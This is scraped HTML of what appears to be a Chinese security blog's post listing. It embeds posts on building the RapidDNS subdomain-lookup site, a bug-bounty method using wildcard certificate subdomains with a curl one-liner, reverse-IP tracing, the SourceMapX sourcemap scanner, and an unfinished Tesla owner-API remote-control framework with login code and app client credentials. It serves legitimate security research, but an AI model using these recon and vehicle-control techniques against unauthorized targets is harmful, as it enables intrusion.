&lt;p&gt;这里说点额外的，对于IPv6地址是可以直接连接的，不需要做映射。一般我们家里的电脑会分配多个IPv6地址，有至少一个临时（temporary，我们连接其他电脑时使用）的地址和secured的。一般我们可以设置一个固定的即可。这里大家还是注意点，避免泄漏IPv6地址。之前看一篇公众号文章，发现对目标的IPv4地址打码了，却没有对IPv6地址打码，这个挺危险的。&lt;/p&gt;
&lt;p&gt;以上这套结构的成本为域名450元，cdn服务器免费的，服务器每月费用20美元（差不多140元），电费每月大概60元。前期投入买了一块三星的SSD，成本1000元。截止目前为止，共投入450+2400+1000=3850元。后续维持现状基本是服务器加域名成本，一年2850元。&lt;/p&gt;
&lt;h2 id=&#34;编码&#34;&gt;编码&lt;/h2&gt;
&lt;p&gt;需要的一些基础知识：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;html+javascript+css基础&lt;/li&gt;
&lt;li&gt;python+flask基础&lt;/li&gt;
&lt;li&gt;elasticsearch基础&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;其实想好了方案，而且本身也不复杂，具体编码就相对简单了许多。比如查询界面的开发，我直接找了一套现成的模版，改改样式就可以了。后端flask边看文档边开发就可以了，没啥好说的。唯一要说一下的是这里flask使用了协程，其查询效果好了很多。当然后面跟insight-labs的A牛沟通过可以换bjoern，据说效果很好，不过这个我没测试，感兴趣的可以试试看，看完也可以分享出来让我学习学习。&lt;/p&gt;
&lt;p&gt;主要的还是在Elasticsearch这里，这里选择他主要因为我比较熟悉，而且有IP字段类型，做IP段查询时非常方便。这里换乘其他的如mongodb、mysql等也可以。mysql使用myisam，加上Partition问题也不大，Insight-labs的QQ群数据查询就是成功案例。大家可以选择自己擅长的。&lt;/p&gt;
&lt;p&gt;后来有朋友过来交流查询速度问题，说他那边的查询速度没我的快。其实主要我这边做了一些优化处理。我在导入数据时，对域名处理，将根域名单独存放一个字段，剩下的部分单独放一个字段。因为不需要模糊匹配，查询速度就会非常快，同时存储空间也可以节省几十G。当然，这牺牲掉了模糊搜索的功能。具体字段可以看下图：&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1616415600955.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;创建mapping：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;{
  &amp;quot;mappings&amp;quot;: {
    &amp;quot;domain&amp;quot;: {
      &amp;quot;properties&amp;quot;: {
        &amp;quot;name&amp;quot;: {
          &amp;quot;type&amp;quot;: &amp;quot;text&amp;quot;

        },
        &amp;quot;type&amp;quot;: {
          &amp;quot;type&amp;quot;: &amp;quot;keyword&amp;quot;

        },
        &amp;quot;value&amp;quot;: {
          &amp;quot;type&amp;quot;: &amp;quot;ip&amp;quot;

        },
        &amp;quot;domain&amp;quot;: {
          &amp;quot;type&amp;quot;: &amp;quot;keyword&amp;quot;

        }
      }
    }
  }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;最关键的其实是导入程序，也是投入时间最多的，因为数据量比较多。单纯使用bulk速度很慢。使用SSD速度会提高几倍。但是依然达不到预期，因为会出现es内存耗尽，队列太多等各种异常，比如导入到8亿多数据时报错。也尝试通过迭代的方式来实现高性能文件读取，但是最后主要的根源还是在es和字符串的处理上。最后采用多进程方式。elasticsearch设置不刷新，0副本，并调整es的queue，线程，最大内存等参数。这个需要根据自己机器配置去进行调整。通过实际使用一天导入大概10亿条记录，当然还是有优化空间的。&lt;/p&gt;
&lt;p&gt;修改index设置的方法：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;{
  &amp;quot;index&amp;quot;: {
    &amp;quot;refresh_interval&amp;quot;: -1,
    &amp;quot;number_of_replicas&amp;quot;: 0
  }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;导入完成后在修改回去即可。&lt;/p&gt;
&lt;p&gt;以上elasticsearch使用的是6.7.1版本。其他版本可能会有差异，根据实际情况调整即可。&lt;/p&gt;
&lt;h2 id=&#34;总结&#34;&gt;总结&lt;/h2&gt;
&lt;p&gt;其实总体来说，本文技术上没啥复杂度，实现起来也相对简单。我觉得有点像以前革命时期八路军的风格（完了往自己脸上贴金了，勿喷），在有限的条件下来尽可能实现自己想要的效果。&lt;/p&gt;
&lt;p&gt;希望本文对你有所帮助，对于上述内容有任何疑问，可以给我发送消息一起交流。&lt;/p&gt;
&lt;p&gt;最后，RapidDNS已经一周年，这一年家人和同事的支持，同学的帮助，以及国内外朋友的称赞和鼓励，才让我坚持维护着网站运行。感谢在网站运行中大家提来的建议和反馈！感谢所有使用RapidDNS的人！感谢你们让RapidDNS更好。&lt;br&gt;
所以，RapidDNS现有查询功能将一直免费开放下去，同时新的一年我也会增加新的功能，也欢迎大家发来你们的建议和想法。&lt;/p&gt;
&lt;p&gt;大家也可以关注公众账号，获取最新的网站功能、使用技巧等内容。&lt;/p&gt;
&lt;center&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1615992545149.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;/center&gt;
&lt;!-- more --&gt;
&lt;center&gt;The End&lt;/center&gt;">我是如何低成本建立RapidDNS.io网站的</a>
      </div>
      
      <div class="item">
        <a class="result-title" href="https://bacde.me/post/RapidDNS-02/"" data-c="
          &lt;p&gt;大家好，我是BaCde。今天给大家分享一下我这个月提交鹅厂漏洞的一个挖掘思路。&lt;/p&gt;
&lt;p&gt;首先说一下结果，一个SQL注入（可报错回显）、弱口令（审核后发现是域名解析IP错误）和一个有限的SSRF漏洞。&lt;/p&gt;
&lt;p&gt;当然今天我要说的不是直接查询子域名，那就没必要写这篇文章了。&lt;/p&gt;
&lt;p&gt;像鹅厂这样规模的企业，其资产数量众多。同样的，其盯着他的大佬们也非常多。而目前收集信息的方法大多数都差不多。本身厂商自己也会对其进行监控、检测。基本上很多被筛选了很多遍。那应该如何去挖掘呢？其中一种思路就是找到别人未发现的一些资产，这将增加挖掘的概率。&lt;/p&gt;
&lt;p&gt;RapidDNS网站在2020年12月的时候增加了5000万的HTTPS证书数据。暂时还没有对证书查询独立（将在新上线的版本独立查询）。&lt;/p&gt;
&lt;!-- more --&gt;
&lt;p&gt;相信大家在测试的时候一定会发现一些目标的SSL证书中Subject的CommonName有*.qq.com这样的情况，有的域名可能为二级或三级，甚至更多。这样的域名大多数意味着下级有子域名。通过对其进行爆破，则可能发现一些之前未发现的资产。&lt;/p&gt;
&lt;p&gt;首先，大家可以通过RapidDNS查询子域名，然后导出csv，对其进行筛选。当然也可以使用一行命令来解决。&lt;/p&gt;
&lt;p&gt;将下面命令中$1换成对应目标即可，如果没结果，可以多请求几次试试。&lt;/p&gt;
&lt;p&gt;curl -s &amp;quot;https://rapiddns.io/subdomain/$1?full=1&amp;quot; | grep -oP &#39;_blank&amp;quot;&amp;gt;\K[^&amp;lt;]*&#39; | grep * |sort -u&lt;/p&gt;
&lt;p&gt;查询结果如下：&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1615992464027.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;把*.去掉，然后批量去爆破子域名。将跑出来的域名在去进行探测挖掘即可，我使用xray成功扫描到其SQL注入漏洞。当然这里的扫描工具就很多了，看各位大佬的习惯了。&lt;/p&gt;
&lt;p&gt;今天的内容就是这么简单，也有一定运气成分。只是提出一种我使用的有效的思路。祝大家好运！！！&lt;/p&gt;
&lt;p&gt;扫描下方二维码可关注公众号&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1615992545149.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;center&gt;The End&lt;/center&gt;">RapidDNS网站在SRC漏洞挖掘中的一个思路</a>
      </div>
      
      <div class="item">
        <a class="result-title" href="https://bacde.me/post/rapiddnsio-tips/"" data-c="
          &lt;p&gt;大家好，我是BaCde。公众号开通了2个月，一直没发内容。本来计划写写网站建设思路，今天先写一篇网站的使用分享。&lt;/p&gt;
&lt;p&gt;网站自发布以来，一直没有什么说明和教程。因为它的功能非常单一，不需要做太多介绍。但是呢，有一些小细节和场景，我觉得可以分享下。&lt;/p&gt;
&lt;p&gt;首先，网站基础功能可以查询网站子域名，根据IP地址或IP段查询绑定的域名信息，这里支持IPv6的地址和地址段。目前最大支持显示1万条（大多数情况下足够了）。其中查询结果页面中有导出csv的功能，可以导出全部结果。其实不导出，查询全部结果只需要加入参数?full=1即可。目前大多数开源工具采集时采用也是这样的方式。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1615429646070.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;下面来说下实际应用场景。&lt;/p&gt;
&lt;h2 id=&#34;信息收集&#34;&gt;信息收集&lt;/h2&gt;
&lt;p&gt;在收集ASN信息时，可以根据反向IP段查询，迅速确定筛选出目标的资产。&lt;/p&gt;
&lt;p&gt;比如下图中搜索到的腾讯结果中，有很多ip段时属于腾讯云服务的机器，这些IP对我们挖掘漏洞来说，意义不大。但是可能又会存在夹杂在其中的个别目标。这时候就可以使用Reverse IP功能进行查询，然后筛选出目标或者筛选IP段。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1615429652715.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;下面随便挑了一个（58.87.64.0/18）查询结果来展示下，发现大多数不是腾讯的域名，则可以跳过，或者从中筛选出腾讯的。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1615429659028.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h2 id=&#34;溯源定位&#34;&gt;溯源定位&lt;/h2&gt;
&lt;p&gt;这里主要说两个场景，第一个就是扫到某个IP存在漏洞，想知道哪个厂商的，第二个就是对于攻击IP地址是属于哪个机构的。这是两个非常常见的需求。&lt;/p&gt;
&lt;p&gt;这里一种方法是直接查询IP地址，那么，当ip地址查不到时怎么办呢？&lt;/p&gt;
&lt;p&gt;今天就在微信群里遇到一个例子。有人在日志中发现了360某团队的一个dnslog的地址，但是打开其域名时一个空白地址。这里我通过获取到解析的IP地址，查询C段，然后很快速的发现了dnslog平台的登录地址，根据版权信息确认是360的。&lt;/p&gt;
&lt;p&gt;其发现的地址形如：xxx.b.nslog.0kee.360.cn。访问nslog.0kee.360.cn为空白，其解析的IP地址为123.59.211.124。通过RapidDNS来查询C段，查询链接：https://rapiddns.io/sameip/123.59.211.124/24#result。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;4&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1615429676971.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;在结果中可以发现一个0kdns.net的域名，访问后就是dnslog平台登录地址。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;5&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1615429683321.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;好了，以上就是我经常使用到的方法，跟大家分享出来。另外，网站由于网络原因，可能会不太稳定。有问题大家可即时反馈，看到后我会第一时间来解决。&lt;/p&gt;
&lt;p&gt;扫描篇下方二维码可关注公众号&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;6&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1615429807479.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;!-- more --&gt;
&lt;p&gt;The END&lt;/p&gt;
">RapidDNS.IO 网站应用实例</a>
      </div>
      
      <div class="item">
        <a class="result-title" href="https://bacde.me/post/sourcemapx/"" data-c="
          &lt;p&gt;SourceMapX是一个批量扫描并恢复sourcemap的源代码文件的脚本。&lt;/p&gt;
&lt;p&gt;项目地址:&lt;br&gt;
&lt;a href=&#34;https://github.com/insightglacier/SourceMapX&#34;&gt;https://github.com/insightglacier/SourceMapX&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;安装&#34;&gt;安装&lt;/h2&gt;
&lt;p&gt;该脚本主要由&lt;a href=&#34;https://github.com/rarecoil/unwebpack-sourcemap&#34;&gt;unwebpack-sourcemap&lt;/a&gt;项目修改而来，使用Python3编写,需要安装 &lt;code&gt;BeautifulSoup4&lt;/code&gt; and &lt;code&gt;requests&lt;/code&gt;.可以使用 &lt;code&gt;pip3 install -r requirements.txt&lt;/code&gt;命令进行安装。主要是修改为批量检测并下载，可用于SRC的漏洞挖掘。&lt;/p&gt;
&lt;!-- more --&gt;
&lt;h2 id=&#34;使用&#34;&gt;使用&lt;/h2&gt;
&lt;p&gt;命令参数：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;usage: SourceMapX.py [-h] [-m METHOD] [-d] [-o OUTPUT] uri_or_file

A tool to extract code from Webpack sourcemaps. Turns black boxes into gray ones.

positional arguments:
  uri_or_file           The target URI or file.

optional arguments:
  -h, --help            show this help message and exit
  -m METHOD, --method METHOD
                        L:Local, R:Remote
  -d, --detect          Attempt to detect sourcemaps from JS assets in retrieved HTML.
  -o OUTPUT, --output OUTPUT
                        Make the output directory if it doesn&#39;t exist.

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;其中-m有R和L，R为Remote（远程），L为Local（本地）。&lt;/p&gt;
&lt;p&gt;-o 为结果文件保存的路径。默认为output。&lt;/p&gt;
&lt;p&gt;将要扫描的url存放到文件中（需要带http或https），如urls.txt，然后运行如下命令。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;python SourceMapX.py -m R -d urls.txt
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;对于探测到的.map文件会url地址会保存到&lt;code&gt;results.txt&lt;/code&gt;文件中。&lt;/p&gt;
&lt;p&gt;程序还不够完善，后续看情况是否更新吧。&lt;/p&gt;
&lt;h2 id=&#34;致谢&#34;&gt;致谢&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/rarecoil/unwebpack-sourcemap&#34;&gt;unwebpack-sourcemap&lt;/a&gt; @rarecoil&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;注：请不要将该脚本用于非法用途，仅用于合法的，经过授权的渗透测试，公司内部安全检查与研究使用。由于使用工具带来的不良后果与本人无关。&lt;/strong&gt;&lt;/p&gt;
">SourceMapX——批量扫描并恢复sourcemap的源代码文件</a>
      </div>
      
      <div class="item">
        <a class="result-title" href="https://bacde.me/post/hacking-all-the-cars-tesla-api-exploit-part-two/"" data-c="
          &lt;p&gt;该系列文章将通过逆向的方式分析Tesla远程api，并自己编写代码实现远程控制Tesla汽车。该篇文章为第二篇，将主要讲解websocket抓包分析与编程实现对Tesla的远程控制。如果你还没看第一篇，请先查看第一篇内容&lt;a href=&#34;https://bacde.me/post/hacking-all-the-cars-tesla-api-exploit-part-one/&#34;&gt;Hacking All The Cars - Tesla 远程API分析与利用（上）&lt;/a&gt;。&lt;/p&gt;
&lt;h2 id=&#34;0x00-websocket通信分析&#34;&gt;0x00 Websocket通信分析&lt;/h2&gt;
&lt;p&gt;Tesla的召唤功能除自动召唤外，还支持手动的前进与后退功能。要想手机APP可以使用召唤功能，需要先在车机中开启召唤功能。&lt;/p&gt;
&lt;p&gt;在测试时，建议寻找一块比较大的空地，然后设置抓包，使用手机APP进行操作。通过burpsuite抓到的数据包可知，召唤功能主要通过websocket来实现。但是分析过程中可以发现，burpsuite只显示了连接地址和发送的数据内容，并没有显示其请求的头，所以，当直接去连接时会返回401错误。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://bacde.me/post-images/1605326984308.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;img src=&#34;/Users/aliceclaudia/work/Blog/%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6tesla%E5%AE%9E%E7%8E%B0/%E4%B8%8B/images/ppt/04_tesla_websockets.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;在这个时候就需要还一个工具了，本文选择使用charles。这个工具针对websocket的支持非常友好，不仅可以看到请求头，还针对发送与接收以不同的颜色区分显示出来，十分方便分析。&lt;/p&gt;
&lt;!-- more --&gt;
&lt;p&gt;&lt;img src=&#34;https://bacde.me/post-images/1605326993757.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;img src=&#34;/Users/aliceclaudia/work/Blog/%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6tesla%E5%AE%9E%E7%8E%B0/%E4%B8%8B/images/ppt/charles.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://bacde.me/post-images/1605326998120.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;img src=&#34;/Users/aliceclaudia/work/Blog/%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6tesla%E5%AE%9E%E7%8E%B0/%E4%B8%8B/images/ppt/charles2.png&#34; alt=&#34;charles2&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;对于抓包环境的设置，这里说一下，因为Tesla是tls+websocket实现，所以我们抓包时需要替换为自己的证书。安卓和ios设置方法存在差异，不过Tesla并不需要sslpin bypass。添加自己的受信任的证书即可。由于我在测试时，安卓机gps有问题，所以我换了iphone，并通过设置sock5类型代理来实现抓包。这些都是抓包常规操作，这里只是提一下，不知道如何设置的朋友自己去搜索一下吧，这里不做赘述。&lt;/p&gt;
&lt;p&gt;为了更好的分析，建议多抓几次前进或者后退的包，便于进行对比。通过对websocket的通信数据分析，请求的数据通信格式为json，每条数据都有时间戳，还有&lt;code&gt;msg_type&lt;/code&gt;字段，经过去重统计，一共有7种&lt;code&gt;msg_type&lt;/code&gt;，分别有&lt;code&gt;control:ping&lt;/code&gt;、&lt;code&gt;autopark:info&lt;/code&gt;、&lt;code&gt;autopark:device_location&lt;/code&gt;、&lt;code&gt;autopark:cmd_forward&lt;/code&gt;、&lt;code&gt;autopark:cmd_reverse&lt;/code&gt;、&lt;code&gt;autopark:heartbeat_app&lt;/code&gt;、&lt;code&gt;autopark:cmd_abort&lt;/code&gt;。其中&lt;code&gt;autopark:device_location&lt;/code&gt;又有两种&lt;code&gt;summon_type&lt;/code&gt;,分别为 &lt;code&gt;find_me&lt;/code&gt;、&lt;code&gt;pin_drop&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;分析多次抓包的结果，确定如下流程：&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://p1.ssl.qhimg.com/t0151d84160f0365327.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;以上流程除&lt;code&gt;autopark:cmd_abort&lt;/code&gt;外缺少一个过程都将会导致召唤失败。当然，实际过程中还会有其他数据包，但是不发送也可以成功召唤。&lt;/p&gt;
&lt;h2 id=&#34;0x01-系统整体设计&#34;&gt;0x01 系统整体设计&lt;/h2&gt;
&lt;p&gt;我将程序的名字命名为TeslaSploit Framework。代码实现以Python3实现。使用协程来完成网络请求，使用的库为aiohttp和websockets。对于程序界面还是选择了交互式控制台的方式，操作和风格与metasploit框架类似。专业叫法为REPL（交互式解释器），即 Read(读取)，Evaluate（执行），Print（打印），Loop（循环）。这里为了快速实现，选择了sploitkit这个库。&lt;/p&gt;
&lt;p&gt;程序界面如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://bacde.me/post-images/1605327033774.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;img src=&#34;/Users/aliceclaudia/work/Blog/%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6tesla%E5%AE%9E%E7%8E%B0/%E4%B8%8B/images/ppt/teslasploit01.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;目录结构则分为data目录，teslasploit目录，入口文件为程序根目录下main.py。data目录下分别放了config文件夹和token，前者存放账号密码，后者存放登录成功后的token等配置信息。teslasploit目录下又lib、banners、modules，分别存在库文件、bannner和利用模块。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1605327061782.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;![](/Users/aliceclaudia/work/Blog/远程控制tesla实现/下/images/ppt/截屏2020-10-21 下午12.06.03.png)&lt;/p&gt;
&lt;p&gt;操作的命令主要以下几个&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;show modules
use exploit/tesla/*
run
back
exit
set [key] [value]
show options
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;对于本次的需求，这些已经足够。&lt;/p&gt;
&lt;h2 id=&#34;0x02-编程实现&#34;&gt;0x02 编程实现&lt;/h2&gt;
&lt;p&gt;该代码仅在macos系统，python3.8.2的系统环境下运行，其他系统未进行测试。&lt;/p&gt;
&lt;h3 id=&#34;控制台&#34;&gt;控制台&lt;/h3&gt;
&lt;p&gt;安装sploitkit库，&lt;code&gt;pip install sploitkit&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;新建main.py文件，写入如下代码&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#!/usr/bin/python3
&amp;quot;&amp;quot;&amp;quot;
Copyright (c) 2020 Ingeek Tiger-team (https://ingeek.com/)
&amp;quot;&amp;quot;&amp;quot;

from __future__ import print_function

try:
    import sys
    sys.dont_write_bytecode = True

    from teslasploit.lib import TeslasploitConsole

except KeyboardInterrupt:
    sys.exit(&amp;quot;&amp;quot;)

if __name__ == &#39;__main__&#39;:
    TeslasploitConsole(&amp;quot;tesla&amp;quot;).start()

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在teslasploit/lib/ 文件夹下创建&lt;code&gt;__init__.py&lt;/code&gt; 文件，写入如下代码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#!/usr/bin/python3
import re
from sploitkit import FrameworkConsole


class TeslasploitConsole(FrameworkConsole):
    sources = {
        &#39;banners&#39;:   &amp;quot;./teslasploit/banners&amp;quot;,
        &#39;entities&#39;:  [&amp;quot;./teslasploit/modules&amp;quot;],
        &#39;libraries&#39;: &amp;quot;./teslasploit&amp;quot;,
    }
    
    def __init__(self, *args, **kwargs):
        super(TeslasploitConsole, self).__init__(*args, **kwargs)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这样，程序的控制台界面就可以运行了。可以输入&lt;code&gt;python3 main.py&lt;/code&gt; 看看效果了。以上两段代码直接参考&lt;a href=&#34;https://github.com/dhondta/python-sploitkit&#34;&gt;https://github.com/dhondta/python-sploitkit&lt;/a&gt; 这里的例子。&lt;/p&gt;
&lt;p&gt;为了程序界面更加酷炫一些，可以增加ascii字形或ascii图形。python有第三方库可以用。当然网络上也有在线转换的工具。这里选择使用python的asciistuff库。&lt;/p&gt;
&lt;p&gt;使用如下两行代码，可随机风格的ascii字形：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from asciistuff import Banner
print(Banner(&amp;quot;Test&amp;quot;))
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;https://bacde.me/post-images/1605327095611.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;img src=&#34;/Users/aliceclaudia/work/Blog/%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6tesla%E5%AE%9E%E7%8E%B0/%E4%B8%8B/images/asciistuff_01.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;如果想生成固定的图形，则可以查看&lt;a href=&#34;https://github.com/dhondta/python-asciistuff/blob/master/asciistuff/fonts.txt&#34;&gt;https://github.com/dhondta/python-asciistuff/blob/master/asciistuff/fonts.txt&lt;/a&gt;。详细用法自行查看&lt;a href=&#34;https://github.com/dhondta/python-asciistuff&#34;&gt;https://github.com/dhondta/python-asciistuff&lt;/a&gt;。这里还有另外一个库，&lt;a href=&#34;https://github.com/jeffbuttars/cowpy&#34;&gt;cowpy&lt;/a&gt;，是cow say风格的图形，可根据自己喜好选择是否使用。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://bacde.me/post-images/1605327086469.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;img src=&#34;/Users/aliceclaudia/work/Blog/%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6tesla%E5%AE%9E%E7%8E%B0/%E4%B8%8B/images/cowpy.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;汽车类编写&#34;&gt;汽车类编写&lt;/h3&gt;
&lt;p&gt;控制台界面已经有了，先来创建一个名为CarBase的类，后面每台车都基于该类创建一个车辆对象，便于进行批量控制。这里的网络通信主要是用&lt;code&gt;aiohttp&lt;/code&gt;和&lt;code&gt;websockets&lt;/code&gt;两个库来完成。直接使用pip 安装即可。&lt;/p&gt;
&lt;p&gt;该类主要包括登录、api请求、获取车辆列表、车辆详细信息、控制（开锁、锁车、空调、温度等）、召唤功能。&lt;/p&gt;
&lt;p&gt;以上功能请求需要用到4个常量，声明如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;TESLA_CLIENT_ID =&amp;quot;81527cff06843c8634fdc09e8ac0abefb46ac849f38fe1e431c2ef2106796384&amp;quot;
TESLA_CLIENT_SECRET =&amp;quot;c7257eb71a564034f9419ee651c7d0e5f7aa6bfbd18bafb5c5c033b093bb2fa3&amp;quot;
TESLA_BASE_URL =&amp;quot;https://owner-api.teslamotors.com/&amp;quot;
TESLA_BASE_WS =&amp;quot;streaming.vn.teslamotors.com&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;具体功能定义如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://bacde.me/post-images/1605327104917.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;img src=&#34;/Users/aliceclaudia/work/Blog/%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6tesla%E5%AE%9E%E7%8E%B0/%E4%B8%8B/images/functions.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;登录&#34;&gt;登录&lt;/h4&gt;
&lt;p&gt;对于aiohttp的基础使用，建议大家去了解一下开发文档。其用法与requests库类似，很容易上手。先以登录来举例子，该代码就是post请求&lt;code&gt;oauth/token?grant_type=password&lt;/code&gt; 登录，登录成功会返回token信息。代码如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;async def login(self):
    data={
        &amp;quot;grant_type&amp;quot;: &amp;quot;password&amp;quot;,
        &amp;quot;client_id&amp;quot;: TESLA_CLIENT_ID,
        &amp;quot;client_secret&amp;quot;: TESLA_CLIENT_SECRET,
        &amp;quot;email&amp;quot;: self.email,
        &amp;quot;password&amp;quot;: self.password,
    }
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
        async with session.post(TESLA_BASE_URL+&amp;quot;oauth/token?grant_type=password&amp;quot;, data=data) as resp:
            if resp.status == 200:
                text = await resp.text()
                self.token = json.loads(text)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;https://bacde.me/post-images/1605327114461.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;img src=&#34;/Users/aliceclaudia/work/Blog/%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6tesla%E5%AE%9E%E7%8E%B0/%E4%B8%8B/images/login.png&#34; alt=&#34;login&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;获取车辆信息&#34;&gt;获取车辆信息&lt;/h4&gt;
&lt;p&gt;首先要获取车辆列表，请求地址为&lt;code&gt;/api/1/vehicles&lt;/code&gt;,请求方式为GET。发送后，根据返回的json内容提取id、display_name、vin字段的值。根据id可以获取车辆详细信息。获取车辆详细信息之前还需要发送&lt;code&gt;/api/1/vehicles/{id}/wake_up&lt;/code&gt;(替换{id}为实际id即可)请求，不然车辆如果在没被唤醒状态下会返回错误。&lt;/p&gt;
&lt;p&gt;车辆详细信息的请求路径为&lt;code&gt;/api/1/vehicles/{id}/vehicle_data&lt;/code&gt;(替换{id}为实际id即可)。在发送请求时都加上&lt;code&gt;Authorization&lt;/code&gt;请求头。获取成功信息以json格式返回，其中包含了很多信息，这里只需要提取vin、display_name、gps、电量、续航、车内温度、车外温度。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;User-Agent: TeslaSploit
Authorization: Bearer [access_token]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;返回的信息为了便于在控制台下显示，采用了&lt;code&gt;terminaltables&lt;/code&gt;这个库来。显示格式如下：&lt;/p&gt;
